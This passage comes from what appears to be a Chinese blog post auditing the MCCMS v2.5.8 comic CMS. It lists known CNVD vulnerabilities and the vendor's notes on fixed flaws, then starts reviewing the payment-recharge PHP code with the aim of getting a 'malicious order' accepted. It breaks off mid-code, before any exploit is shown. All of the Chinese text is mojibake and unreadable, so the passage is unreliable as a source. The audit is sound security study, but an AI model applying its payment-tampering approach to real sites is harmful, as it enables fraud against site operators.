â”‚â”€wap <span class="regexp">//</span>å‰å°æ‰‹æœºæ¨¡ç‰ˆ</span><br><span class="line">â”‚â”€admin.php <span class="regexp">//</span>åå°å…¥å£æ–‡ä»¶ï¼ˆä¸ºäº†å®‰å…¨èµ·è§ï¼Œè¯·ä¿®æ”¹æ–‡ä»¶åï¼‰ã€å¯èƒ½å­˜åœ¨ã€‘</span><br><span class="line">â””â”€index.php <span class="regexp">//</span>å…¥å£æ–‡ä»¶ã€å¯èƒ½å­˜åœ¨ã€‘</span><br></pre></td></tr></table></figure><h3 id="æ¨¡æ¿ç›®å½•ç»“æ„"><a href="#æ¨¡æ¿ç›®å½•ç»“æ„" class="headerlink" title="æ¨¡æ¿ç›®å½•ç»“æ„"></a>æ¨¡æ¿ç›®å½•ç»“æ„</h3><p>ç³»ç»Ÿæ¨¡æ¿ç³»ç»Ÿæ”¾åœ¨&#x2F;template&#x2F;ç›®å½•ä¸‹ã€‚åœ¨åå°ç«™ç‚¹è®¾ç½®ä¸­ï¼Œå¯ä»¥é€‰æ‹©å½“å‰ä½¿ç”¨çš„æ¨¡æ¿</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">â”‚â”€template/[<span class="keyword">pc</span>/wap]/<span class="number">1</span>/ æ¨¡æ¿<span class="number">1</span></span><br><span class="line">â”‚ â”œâ”€js jsæ–‡ä»¶</span><br><span class="line">â”‚ â”œâ”€css cssæ–‡ä»¶</span><br><span class="line">â”‚ â”œâ”€images å›¾ç‰‡æ–‡ä»¶</span><br><span class="line">â”‚ â”œâ”€html æ¨¡æ¿æ–‡ä»¶ç›®å½•ï¼ˆè¯¥ç›®å½•åå¯ä»¥éšæ„ä¿®æ”¹ï¼Œæ³¨æ„tpl.phpä¹Ÿæœ‰éœ€è¦åŒæ—¶ä¿®æ”¹ï¼‰</span><br><span class="line">â”‚ â”‚  â”‚â”€custom è‡ªå®šä¹‰æ¨¡æ¿ç›®å½•</span><br><span class="line">â”‚ â”‚  â”‚â”€author ä½œè€…ä¸­å¿ƒç›®å½•</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€packs.html æ ·å¼æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€head.html æ¨¡æ¿å¤´éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€bottom.html æ¨¡æ¿åº•éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€<span class="keyword">left</span>.html æ¨¡æ¿å·¦éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€<span class="keyword">right</span>.html æ¨¡æ¿å³éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€chapter.html ç« èŠ‚åˆ—è¡¨æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€chapter_add.html æ–°å¢ç« èŠ‚æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€chapter_edit.html ä¿®æ”¹ç« èŠ‚æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€comic.html æ¼«ç”»åˆ—è¡¨æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€comic_add.html æ–°å¢æ¼«ç”»æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€comic_info.html æ¼«ç”»è¯¦æƒ…æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€comment.html è¯»è€…è¯„è®ºæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€drawing.html æç°è®°å½•æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€drawing_add.html ç”³è¯·æç°æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€home.html ä½œè€…ä¸»é¡µæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€income.html åˆ†æˆè®°å½•æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€<span class="built_in">index</span>.html ä½œè€…ä¸­å¿ƒä¸»é¡µæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€renzheng.html ä½œè€…è®¤è¯æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€user è¯»è€…ä¸­å¿ƒç›®å½•</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€packs.html æ ·å¼æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€head.html æ¨¡æ¿å¤´éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€bottom.html æ¨¡æ¿åº•éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€<span class="keyword">left</span>.html æ¨¡æ¿å·¦éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€<span class="keyword">right</span>.html æ¨¡æ¿å³éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€<span class="built_in">index</span>.html è¯»è€…ä¸­å¿ƒä¸»é¡µæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€bind.html ç¬¬ä¸‰æ–¹è´¦å·ç»‘å®šæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€buy.html æ¶ˆè´¹è®°å½•æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€comic.html æ¼«ç”»è´­ä¹°è®°å½•æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€comment.html è¯„è®ºè®°å½•æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€fav.html æ¼«ç”»æ”¶è—è®°å½•æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€info.html èµ„æ–™ä¿®æ”¹æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€info_pass.html å¯†ç ä¿®æ”¹æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€message.html æ¶ˆæ¯åˆ—è¡¨æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€order.html å……å€¼è®¢å•è®°å½•æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€<span class="keyword">read</span>.html é˜…è¯»è®°å½•æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€ticket.html æœˆç¥¨æ¶ˆè´¹è®°å½•æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€pay.html å……å€¼ä¸­å¿ƒæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€pay_cion.html è™šæ‹Ÿå¸å……å€¼æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€pay_ticket.html è´­ä¹°æœˆç¥¨æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€pay_vip.html å……å€¼VIPæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€<span class="keyword">reg</span>.html ç”¨æˆ·æ³¨å†Œæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€login.html ç”¨æˆ·ç™»é™†æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚  â”‚â”€pass.html æ‰¾å›å¯†ç æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€packs.html æ ·å¼æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€head.html æ¨¡æ¿å¤´éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚â”€bottom.html æ¨¡æ¿åº•éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚â”€<span class="keyword">left</span>.html æ¨¡æ¿å·¦éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚â”€<span class="keyword">right</span>.html æ¨¡æ¿å³éƒ¨æ–‡ä»¶</span><br><span class="line">â”‚ â”‚  â”‚â”€category.html æ¼«ç”»æ£€ç´¢æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€chapter.html æ¼«ç”»é˜…è¯»æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€comic.html æ¼«ç”»è¯¦æƒ…æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€comment.html æ¼«ç”»è¯„è®ºæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€error.html é”™è¯¯æç¤ºæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€<span class="built_in">index</span>.html ä¸»é¡µæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€lists.html åˆ†ç±»é¡µæ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”‚  â”‚â”€<span class="built_in">search</span>.html æ¼«ç”»æœç´¢æ¨¡ç‰ˆ</span><br><span class="line">â”‚ â”œâ”€pic.png æ¨¡æ¿æ¼”ç¤ºå›¾ç‰‡æ–‡ä»¶</span><br><span class="line">â”‚ â”œâ”€tpl.php æ¨¡æ¿ä¿¡æ¯æ–‡ä»¶</span><br><span class="line">â”‚â”€tempalte/[<span class="keyword">pc</span>/wap]/<span class="number">2</span>/ æ¨¡æ¿<span class="number">2</span></span><br><span class="line">â”‚â”€â€¦</span><br><span class="line">â”‚â”€template/[<span class="keyword">pc</span>/wap]/n/ æ¨¡æ¿<span class="keyword">N</span></span><br></pre></td></tr></table></figure><h3 id="ç‰ˆæœ¬æ›´æ–°æ–‡æ¡£"><a href="#ç‰ˆæœ¬æ›´æ–°æ–‡æ¡£" class="headerlink" title="ç‰ˆæœ¬æ›´æ–°æ–‡æ¡£"></a>ç‰ˆæœ¬æ›´æ–°æ–‡æ¡£</h3><p>å½“æˆ‘ä»¬åœ¨åå°é¡µé¢æ—¶ï¼Œä¼šå¼¹å‡ºæ›´æ–°æé†’ï¼Œåœ¨è¿™æé†’ä¸­æˆ‘ä»¬å¤§è‡´å¾—åˆ°äº†å‡ ä¸ªå·²çŸ¥æ¼æ´çš„å­˜åœ¨</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å½“å‰ç¯å¢ƒmccms <span class="built_in">v2</span>.<span class="number">5</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure><p><img src="/2022/11/22/CMS-Test/image-20221122212640814.png" alt="image-20221122212640814"></p><p><img src="/2022/11/22/CMS-Test/image-20221122211650800.png" alt="image-20221122211650800"></p><p>åœ¨å®˜æ–¹æç¤ºæ›´æ–°çš„æ–‡æ¡£ä¸­ï¼Œæˆ‘ä»¬å¾—åˆ°æ¶ˆæ¯</p><p>åœ¨å½“å‰<code>v2.5.8</code>ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨è‡³å°‘4ä¸ªæ¼æ´</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ä¿®å¤äº†å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·</span><br><span class="line"><span class="number">2.</span>ä¿®å¤äº†ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´</span><br><span class="line"><span class="number">3.</span>ä¿®å¤äº†<span class="keyword">SQL</span>æ³¨å…¥æ¼æ´</span><br><span class="line"><span class="number">4.</span>ä¿®å¤äº†åå°ä¸€å¤„å®‰å…¨æ¼æ´</span><br></pre></td></tr></table></figure><h2 id="CMSå·²è¢«æ‰¾åˆ°çš„å…¬å¼€æ¼æ´ä¿¡æ¯"><a href="#CMSå·²è¢«æ‰¾åˆ°çš„å…¬å¼€æ¼æ´ä¿¡æ¯" class="headerlink" title="CMSå·²è¢«æ‰¾åˆ°çš„å…¬å¼€æ¼æ´ä¿¡æ¯"></a><code>CMS</code>å·²è¢«æ‰¾åˆ°çš„å…¬å¼€æ¼æ´ä¿¡æ¯</h2><p><code>CNVD-2021-51411</code>ã€å±å®³ä½ã€‘</p><table><thead><tr><th>å…¬å¼€æ—¶é—´2021-08-18</th><th>æŠ¥é€æ—¶é—´2021-07-06</th></tr></thead><tbody><tr><td>æ”¶å½•æ—¶é—´2021-07-16</td><td>æ›´æ–°æ—¶é—´2021-07-16</td></tr><tr><td><code>CVSS 2.0--</code></td><td></td></tr><tr><td><code>CVSS 3.X--</code></td><td></td></tr><tr><td>å½±å“äº§å“æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ æ¼«åŸ<code>CMS v2.5.2</code></td><td></td></tr></tbody></table><p><code>CNVD-2021-48907</code>ã€å±å®³é«˜ã€‘</p><table><thead><tr><th>å…¬å¼€æ—¶é—´2021-08-12</th><th>æŠ¥é€æ—¶é—´2021-06-28</th></tr></thead><tbody><tr><td>æ”¶å½•æ—¶é—´2021-07-09</td><td>æ›´æ–°æ—¶é—´2021-07-09</td></tr><tr><td><code>CVSS 2.0--</code></td><td></td></tr><tr><td><code>CVSS 3.X--</code></td><td></td></tr><tr><td>å½±å“äº§å“æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ æ¼«åŸ<code>CMS v2.5.2</code></td><td></td></tr></tbody></table><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CNVD<span class="string">-2021</span><span class="string">-51867</span></span><br><span class="line"></span><br><span class="line">ä¸­å± Mccmså­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´</span><br><span class="line"></span><br><span class="line">æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ Mccms v2.5.2</span><br><span class="line"></span><br><span class="line">2021<span class="string">-08</span><span class="string">-18</span></span><br></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CNVD<span class="string">-2021</span><span class="string">-51492</span></span><br><span class="line"></span><br><span class="line">ä¸­å± Mccmså­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´</span><br><span class="line"></span><br><span class="line">æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ Mccms v2.5.2</span><br><span class="line"></span><br><span class="line">2021<span class="string">-08</span><span class="string">-18</span></span><br></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CNVD<span class="string">-2021</span><span class="string">-51860</span></span><br><span class="line"></span><br><span class="line">ä¸­å± Mccmså­˜åœ¨é€»è¾‘ç¼ºé™·æ¼æ´</span><br><span class="line"></span><br><span class="line">æ¡‚æ—å´‡èƒœç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ Mccms v2.5.2</span><br><span class="line"></span><br><span class="line">2021<span class="string">-08</span><span class="string">-18</span></span><br></pre></td></tr></table></figure><h2 id="æ‰¹é‡ä»£ç å®¡è®¡"><a href="#æ‰¹é‡ä»£ç å®¡è®¡" class="headerlink" title="æ‰¹é‡ä»£ç å®¡è®¡"></a>æ‰¹é‡ä»£ç å®¡è®¡</h2><p><code>Seay</code>ä»£ç å®¡è®¡</p><p><img src="/2022/11/22/CMS-Test/image-20221122165423902.png" alt="image-20221122165423902"></p><p>ç”±æˆ‘ä»¬å¯¹æ›´æ–°æ–‡æ¡£ä¸­çš„ä¿¡æ¯ä»¥åŠç›®å½•ç»“æ„çŒœæµ‹è¿™äº›æ¼æ´å¤§æ¦‚å‡ºç°åœ¨å“ªäº›ä»£ç å¤„</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="1-å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·"><a href="#1-å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·" class="headerlink" title="1.å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·"></a>1.å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å……å€¼æœˆç¥¨é€»è¾‘ç¼ºé™·</span><br><span class="line">çŒœæµ‹ä¸ºæ”¯ä»˜æ¼æ´</span><br><span class="line">å¸¸è§å¤§è‡´æœ‰4ç§ï¼Œä¿®æ”¹å•ä»·ï¼Œä¿®æ”¹æ€»ä»·ï¼Œä¿®æ”¹è´­ä¹°æ•°é‡ï¼Œä»¥åŠé‡å¤å‘åŒ…å¯¼è‡´ä»¥å°‘é‡çš„é’±å®ç°å¤šæ¬¡è´­ä¹°</span><br></pre></td></tr></table></figure><h4 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p>æŸ¥çœ‹æ”¯ä»˜ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php </span></span><br><span class="line">  <span class="comment">//é‡‘å¸</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;cion&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">20</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">20</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">30</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">50</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">50</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//VIP</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;vip&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb1,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;æœˆåº¦VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;æœ‰æ•ˆæœŸ30å¤©&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">90</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb2,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;å­£åº¦VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;æœ‰æ•ˆæœŸ90å¤©&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">180</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb3,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;åŠå¹´VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;æœ‰æ•ˆæœŸ180å¤©&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">365</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb4,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;å¹´åº¦VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;æœ‰æ•ˆæœŸ365å¤©&#x27;</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//æœˆç¥¨</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;ticket&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">1</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">5</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"><span class="comment">/*ä¸Šé¢ä¸‰ä¸ªæ•°ç»„å®ç°äº†rmbï¼Œé‡‘å¸ï¼Œæœˆç¥¨ï¼Œvipä¹‹é—´çš„å…‘æ¢ç‡*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ”¯ä»˜æ–¹å¼</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_wxpay&#x27;</span>] = Pay_Wx_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_alipay&#x27;</span>] = Pay_Ali_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_qqpay&#x27;</span>] = Pay_QQ_Mode;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸»è¦æ˜¯å¯¹æ•°æ®ä¹‹é—´å…³ç³»çš„å®šä¹‰ï¼Œå…³é”®åœ¨ä¸‹æ–¹ä»£ç ä¸­ï¼Œå¦‚ä½•è®©æˆ‘ä»¬çš„æ¶æ„è®¢å•æˆåŠŸå¹¶å…¥åº“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line"> <span class="comment">//å……å€¼è®¢å•å…¥åº“</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$type</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;type&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$pay</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;pay&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$rmb</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;rmb&#x27;</span>);</span><br><span class="line">    <span class="variable">$num</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;num&#x27;</span>);</span><br><span class="line">    <span class="variable">$day</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;day&#x27;</span>);</span><br><span class="line"><span class="variable">$card</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;card&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$dayarr</span> = <span class="keyword">array</span>(<span class="number">30</span>,<span class="number">90</span>,<span class="number">180</span>,<span class="number">365</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$day</span> == <span class="number">0</span>) <span class="variable">$day</span> = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; (<span class="variable">$rmb</span> == <span class="number">0</span> || <span class="variable">$rmb</span> &gt;<span class="number">9999</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;é‡‘é¢é”™è¯¯!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; <span class="variable">$rmb</span> &lt; Pay_Rmb_Min) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;æœ€ä½å……å€¼é‡‘é¢&#x27;</span>.Pay_Rmb_Min.<span class="string">&#x27;å…ƒ&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span> &amp;&amp; <span class="variable">$num</span> == <span class="number">0</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;æœˆç¥¨æ•°é‡é”™è¯¯!!!&#x27;</span>);</span><br><span class="line">    <span 